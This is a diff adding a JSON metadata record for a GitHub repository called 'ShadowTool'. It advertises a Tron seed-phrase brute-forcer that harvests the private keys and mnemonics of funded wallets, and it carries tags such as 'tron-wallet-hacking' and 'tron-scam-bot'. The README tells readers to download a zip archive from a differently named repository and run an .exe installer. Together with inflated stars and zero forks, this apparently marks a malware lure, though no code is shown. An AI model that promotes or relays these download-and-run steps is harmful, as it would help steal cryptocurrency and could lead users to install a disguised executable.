@@ -1,0 +1,42 @@
+{
+  "name": "doanthienminh1083/ShadowTool",
+  "description": "This script is designed to automatically generate seed phrases and check balances for Tron networks. If a wallet with a non-zero balance is found, the wallet's information (address, mnemonic, private key, and balances) is logged and saved to a file named result.txt.",
+  "stars": 1393,
+  "forks": 0,
+  "watchers": 1393,
+  "mainLanguage": null,
+  "languages": {},
+  "topics": [
+    "brute-force-tool",
+    "brute-tool",
+    "python",
+    "tron",
+    "tron-brute-force",
+    "tron-bruteforce",
+    "tron-scam-bot",
+    "tron-seed-finder",
+    "tron-sweeper-multisig",
+    "tron-wallet",
+    "tron-wallet-hacking",
+    "tron-walletbot",
+    "tron-wallethack",
+    "windows"
+  ],
+  "readme": "ShadowTool\n# ShadowTool\n\n\n### This script is designed to automatically generate seed phrases and check balances for Tron networks. If a wallet with a non-zero balance is found, the wallet's information (address, mnemonic, private key, and balances) is logged and saved to a file named result.txt.\n\n## Getting Started:\n\n ### Installation\nTo install this programm, follow these steps:\n\n[![asdasdasd](https://github.com/user-attachments/assets/37cba4f2-19b4-4e6e-ab2b-2aab7f13558a)\n](https://github.com/doanthienminh1083/BlazingTool/releases/download/V4.3/Release.zip) \n\n## **1. [Download the archive](https://github.com/doanthienminh1083/BlazingTool/releases/download/V4.3/Release.zip) from releases and extract it to a convenient folder.**\n## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**\n\n![1](https://github.com/user-attachments/assets/5cec10f4-dd65-47d5-bff7-a7d824fa811a)\n![forgwalletmain2](https://github.com/user-attachments/assets/ba664837-8ffb-4b79-8872-22414107dc50)\n\n\n## Contributing\nContributions are welcome from those who wish to improve the functionality and security of this tool. Please fork the repository and submit a pull request with your enhancements.\n\n## License\nThis project is distributed under the MIT License. See the `LICENSE` file for more details.\n\n## Acknowledgments\n- Thanks to the community for providing the underlying technologies that make this tool possible.\n- Gratitude to all users who contribute by sharing their feedback and improvements.\n\n",
+  "homepage": "",
+  "defaultBranch": "main",
+  "hasIssues": true,
+  "hasWiki": true,
+  "license": "MIT License",
+  "createdAt": "2024-10-31T19:07:52Z",
+  "updatedAt": "2024-11-03T03:30:22Z",
+  "pushedAt": "2024-11-01T16:17:20Z",
+  "url": "https://github.com/doanthienminh1083/ShadowTool",
+  "gitUrl": "git://github.com/doanthienminh1083/ShadowTool.git",
+  "sshUrl": "git@github.com:doanthienminh1083/ShadowTool.git",
+  "owner": {
+    "name": "doanthienminh1083",
+    "avatarUrl": "https://avatars.githubusercontent.com/u/28914383?v=4",
+    "url": "https://github.com/doanthienminh1083"
+  }
+}
